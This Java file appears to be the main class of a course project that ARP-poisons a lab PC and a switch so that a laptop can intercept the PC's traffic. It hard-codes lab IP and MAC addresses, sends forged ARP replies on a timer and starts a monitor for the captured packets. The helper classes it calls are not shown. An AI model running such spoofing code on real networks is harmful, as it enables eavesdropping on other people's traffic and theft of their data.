//   ARP Poisoning Program
//   Version: Released 1
//   Programmed as the Project of Advanced Computer Networks Course
//   Author:   Zhang Yang  (SY0806506)
//             Wang Jingke (SY0806501)

package arpsoft;

public class ARPPoisoningMain {
	public static void main(String[] args) throws Exception {
		
		  //IP & MAC information of experiment computer No.1
		  //It's a laptop,with
		  //IP:  192.168.0.142
		  //MAC: 00-C0-9F-56-3C-70
		String lapIP = "192.168.0.142";
		byte[] lapMac = 
			{(byte)0x00,(byte)0xC0,(byte)0x9F,(byte)0x56,(byte)0x3C,(byte)0x70};

		  //IP & MAC information of experiment computer No.2
		  //It's a PC workstation, with
		  //IP:  192.168.0.173
		  //MAC: 00-10-DC-FB-17-87
		String pcIP = "192.168.0.173";
		byte[] pcMac = 
			{(byte)0x00,(byte)0x10,(byte)0xDC,(byte)0xFB,(byte)0x17,(byte)0x87};
		
		  //IP & MAC information of experiment computer No.3
		  //It's a switch, with
		  //IP:  192.168.0.1
		  //MAC: 00-E0-FC-30-34-82
		String gateIP = "192.168.0.1";
		byte[] gateMac = 
			{(byte)0x00,(byte)0xE0,(byte)0xFC,(byte)0x30,(byte)0x34,(byte)0x82};
		
		
		//To send fake ARP reply messages mingled with correct ARP reply packets.
		//try {	
			  //Send a fake ARP reply message every 200ms
			ARPSender poisonPC = new ARPSender(new BindTable(gateIP, lapMac));
			poisonPC.Send(new BindTable(pcIP, pcMac), 2000);
			
			  //Send a correct ARP reply message every 50ms
			ARPSender dePoisonPC = new ARPSender(new BindTable(gateIP, gateMac));
			dePoisonPC.Send(new BindTable(pcIP, pcMac), 500);
			  //As it goes,
			  //there will be 1 pack of fake ARP reply message 
			  //          and 3 packs of correct ARP reply message, statistically.
			
			
			//The code below shows how to poison the ARP table of the SWITCH
			//We place it here AS AN EXAMPLE, we DON'T use it in this experiment.
			/*	
		 	ARPSender poisonGate = new ARPSender(new BindTable(pcIP, lapMac));
			poisonGate.Send(new BindTable(gateIP,gateMac), 5000);
			ARPSender dePoisonGate = new ARPSender(new BindTable(pcIP, pcMac));
			dePoisonGate.Send(new BindTable(gateIP,gateMac), 5); 
			*/
			//SWITCH Poisoning ends
			
		//} catch (IOException iOException){System.out.println("Who cares!");}
		
		
		ARPMonitor probe = new ARPMonitor();
		  //MONITOR the client.
		  //PROBE is a listener who merges information
		  //   from packets which 'stolen' from the poisoned client.
		System.out.println("Monitoring...");
		probe.Monitor("192.168.0.142");	

	}

}
